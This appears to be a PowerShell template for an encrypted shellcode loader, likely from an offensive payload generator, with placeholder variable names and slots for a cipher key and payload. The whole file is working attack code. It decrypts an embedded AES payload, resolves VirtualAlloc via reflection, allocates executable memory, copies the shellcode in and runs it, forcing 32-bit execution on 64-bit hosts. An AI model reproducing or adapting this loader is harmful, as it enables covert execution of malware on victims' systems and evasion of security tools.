$%%VAR1%% = @'
$%%VAR14%% = "%%CIPHER%%"

function %%VAR15%%($%%VAR16%%, $%%VAR18%%) {
    $%%VAR17%% = New-Object "System.Security.Cryptography.AesManaged"
    $%%VAR17%%.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $%%VAR17%%.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $%%VAR17%%.BlockSize = 128
    $%%VAR17%%.KeySize = 256
    if ($%%VAR18%%) {
        if ($%%VAR18%%.getType().Name -eq "String") {
            $%%VAR17%%.IV = [System.Convert]::FromBase64String($%%VAR18%%)
        }
        else {
            $%%VAR17%%.IV = $%%VAR18%%
        }
    }
    if ($%%VAR16%%) {
        if ($%%VAR16%%.getType().Name -eq "String") {
            $%%VAR17%%.Key = [System.Convert]::FromBase64String($%%VAR16%%)
        }
        else {
            $%%VAR17%%.Key = $%%VAR16%%
        }
    }
    $%%VAR17%%
}
function %%VAR19%%() {
    $%%VAR20%% = %%VAR15%%
    $%%VAR21%% = New-Object System.Security.Cryptography.SHA256Managed
    $%%VAR22%% = [System.Text.Encoding]::UTF8.GetBytes($%%VAR14%%)
    $%%VAR23%% = $%%VAR21%%.ComputeHash($%%VAR22%%)
    $%%VAR24%% = [System.Convert]::ToBase64String($%%VAR23%%)
    return $%%VAR24%%
}
function %%VAR25%%($%%VAR26%%, $%%VAR27%%) {
    $%%VAR28%% = [System.Convert]::FromBase64String($%%VAR27%%)
    $%%VAR30%% = $%%VAR28%%[0..15]
    $%%VAR29%% = %%VAR15%% $%%VAR26%% $%%VAR30%%
    $%%VAR31%% = $%%VAR29%%.CreateDecryptor();
    $%%VAR32%% = $%%VAR31%%.TransformFinalBlock($%%VAR28%%, 16, $%%VAR28%%.Length - 16);
    [System.Text.Encoding]::UTF8.GetString($%%VAR32%%).Trim([char]0)
}

function %%VAR2%% {
        Param ($%%VAR4%%, $%%VAR5%%)
        $%%VAR3%% = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        $%%VAR33%% = $%%VAR3%%.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
        return $%%VAR33%%.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($%%VAR3%%.GetMethod('GetModuleHandle')).Invoke($null, @($%%VAR4%%)))), $%%VAR5%%))
}

function %%VAR6%% {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $%%VAR9%%,
                [Parameter(Position = 1)] [Type] $%%VAR7%% = [Void]
        )

        $%%VAR8%% = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $%%VAR8%%.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $%%VAR9%%).SetImplementationFlags('Runtime, Managed')
        $%%VAR8%%.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $%%VAR7%%, $%%VAR9%%).SetImplementationFlags('Runtime, Managed')

        return $%%VAR8%%.CreateType()
}

$%%VAR10%% = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%%PAYLOAD%%'))
$%%VAR34%% = %%VAR19%%
$%%VAR35%% = %%VAR25%% $%%VAR34%% $%%VAR10%%
[Byte[]]$%%VAR10%% = [System.Convert]::FromBase64String($%%VAR35%%.Replace('"',""))
$%%VAR11%% = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%%VAR2%% kernel32.dll VirtualAlloc), (%%VAR6%% @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$%%VAR12%% = $%%VAR11%%.Invoke([IntPtr]::Zero, $%%VAR10%%.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($%%VAR10%%, 0, $%%VAR12%%, $%%VAR10%%.length)

$%%VAR13%% = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($%%VAR12%%, (%%VAR6%% @([IntPtr]) ([Void])))
$%%VAR13%%.Invoke([IntPtr]::Zero)
'@
If ([IntPtr]::size -eq 8) {
        start-job { param($%%VAR33%%) iex $%%VAR33%% } -RunAs32 -Argument $%%VAR1%% | wait-job | receive-job
}
else {
        iex $%%VAR1%%
}

